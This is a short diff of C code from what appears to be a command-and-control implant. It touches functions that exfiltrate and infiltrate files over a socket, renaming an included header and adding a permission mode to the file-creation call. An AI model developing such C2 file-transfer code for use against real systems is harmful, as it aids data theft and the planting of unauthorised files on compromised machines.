@@ -7,7 +7,7 @@
 #include <string.h>
 
 #include "c2_prot.h"
-#include "actions.h"
+#include "commands.h"
 
 void exfiltrate_file(int sockfd, struct exf_req *req)
 {
@@ -85,7 +85,7 @@ void infiltrate_file(int sockfd, struct inf_req *req)
     printf("File path: %s\n", req->path_content);
     printf("File size: %u\n", req->content_len);
 
-    if ((fd = open(path, O_WRONLY | O_CREAT)) < 0)
+    if ((fd = open(path, O_WRONLY | O_CREAT, req->perm)) < 0)
     {
         perror("Error opening file");
         status = OPEN_ERROR;
